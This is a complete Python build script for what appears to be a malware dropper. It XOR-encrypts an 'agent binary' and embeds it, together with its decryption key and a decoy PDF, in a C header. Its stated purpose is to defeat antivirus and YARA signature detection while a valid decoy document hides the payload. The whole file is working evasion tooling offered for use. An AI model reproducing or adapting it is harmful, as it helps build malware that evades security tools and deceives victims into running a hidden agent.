#!/usr/bin/env python3
"""Convert two binary files to a C header with AGENT_BINARY and DECOY_DATA arrays.

The agent binary is XOR-encrypted before embedding to defeat static AV/YARA
signature matching. The decoy PDF is stored as-is (must remain a valid document).

Usage: bin2header.py [--key <hex_key>] <agent_binary> <decoy_file> <output_header>
"""

import sys
import argparse


def _xor_encrypt(data: bytes, key: bytes) -> bytes:
    if not key:
        return data
    return bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))


def _parse_key(hex_str: str) -> bytes:
    try:
        key = bytes.fromhex(hex_str)
    except ValueError as e:
        print(f"Error: invalid hex key '{hex_str}': {e}", file=sys.stderr)
        sys.exit(1)
    if not key:
        print("Error: key must be non-empty", file=sys.stderr)
        sys.exit(1)
    return key


def _write_array(f, name, data):
    f.write(f'const unsigned char {name}[] = {{\n')
    for i, b in enumerate(data):
        f.write(f'0x{b:02x},')
        if (i + 1) % 16 == 0:
            f.write('\n')
    f.write('\n};\n')
    f.write(f'const size_t {name}_SIZE = {len(data)};\n')


def main():
    parser = argparse.ArgumentParser(
        description="Generate agent_binary.h with XOR-encrypted agent payload"
    )
    parser.add_argument("--key", type=str, default=None,
                        help="XOR encryption key as hex string (e.g. 2B7E151628AED2A6)")
    parser.add_argument("agent_binary", help="Path to the compiled agent binary")
    parser.add_argument("decoy_file", help="Path to the decoy PDF")
    parser.add_argument("output_header", help="Path to the output C header file")

    args = parser.parse_args()

    agent_path = args.agent_binary
    decoy_path = args.decoy_file
    out_path = args.output_header

    key = _parse_key(args.key) if args.key else b''

    try:
        with open(agent_path, 'rb') as f:
            agent_data = f.read()
    except (IOError, OSError) as e:
        print(f"Error reading agent binary '{agent_path}': {e}", file=sys.stderr)
        sys.exit(1)

    try:
        with open(decoy_path, 'rb') as f:
            decoy_data = f.read()
    except (IOError, OSError) as e:
        print(f"Error reading decoy file '{decoy_path}': {e}", file=sys.stderr)
        sys.exit(1)

    encrypted_agent = _xor_encrypt(agent_data, key)

    with open(out_path, 'w') as f:
        f.write('#pragma once\n')
        f.write('#include <cstddef>\n')
        f.write('namespace inferno { namespace wrapper {\n')
        _write_array(f, 'AGENT_BINARY', encrypted_agent)
        f.write('\n')
        # Store the XOR key in the header alongside the ciphertext.
        # The wrapper reads it at compile time for decryption.
        if key:
            f.write(f'const unsigned char XOR_KEY[] = {{\n')
            for i, b in enumerate(key):
                f.write(f'0x{b:02x},')
                if (i + 1) % 16 == 0:
                    f.write('\n')
            f.write('\n};\n')
            f.write(f'const size_t XOR_KEY_LEN = {len(key)};\n')
            f.write('\n')
        _write_array(f, 'DECOY_DATA', decoy_data)
        f.write('} }\n')

if __name__ == '__main__':
    main()
